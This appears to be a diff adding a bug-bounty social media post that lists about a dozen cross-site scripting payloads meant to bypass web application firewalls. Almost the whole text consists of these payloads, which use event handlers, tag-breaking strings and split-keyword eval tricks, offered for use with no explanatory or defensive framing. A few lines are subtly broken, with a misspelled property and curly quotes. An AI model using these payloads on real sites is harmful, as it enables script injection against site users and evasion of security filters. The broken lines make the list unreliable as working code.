@@ -1,0 +1,16 @@
+XSS FIREWALL BYPASS PAYLOADS :
+
+"/><svg/onload=alert(/XSS/)>
+'><marquee onstart="[117].find(confirm)">
+"});</script>*/<img> src=x onerror=&emsp;prompt'${document.domaim}'>
+"<noscript><p title="</noscript><img src=x onerror=debugger;alert(1);>"></p></noscript>
+“><script>alert(‘<img src=”https://lnkd.in/dng8crqi' ”/>’);</script> //
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+
+#webapplications #scripting #automation #bugbounty #bugbountytips #hackerone #bugcrowd #cybersecurity #vapt
